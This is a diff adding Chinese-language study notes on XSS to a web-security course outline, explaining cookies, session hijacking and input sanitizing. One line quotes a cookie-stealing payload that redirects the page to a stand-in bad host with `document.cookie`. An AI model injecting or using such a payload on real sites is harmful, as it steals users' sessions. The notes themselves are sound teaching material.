@@ -73,3 +73,11 @@
    1. [sql injection](https://www.hacksplaining.com/exercises/sql-injection)
    2. [Front End Code](https://github.com/aneagoie/security-client-exercise)
    3. [Back End Code](https://github.com/aneagoie/security-server-exercise)
+7. XSS：
+   1. 讓其它browser執行危險的javascript，方法是把javascript注入input中，顯現在文章中，其它client讀了文章就中獎。
+   2. 最有名的就是`window.location = 'haxxed.com?cookie=' + document.cookie`，`haxxed.com`是某個壞網站。
+   3. cookie：
+      1. server會丟給client，client會存在browser裡。
+      2. server可以認browser的cookie，就直接讓他登入，而不用再輸入帳號和密碼了。
+      3. 所以cookie不能亂給別人，而上面的XSS就會把cookie給別人，讓別人可以登入你的帳號，這稱為**session hijack**。
+      4. 預防方式依然是`sanitizing input`
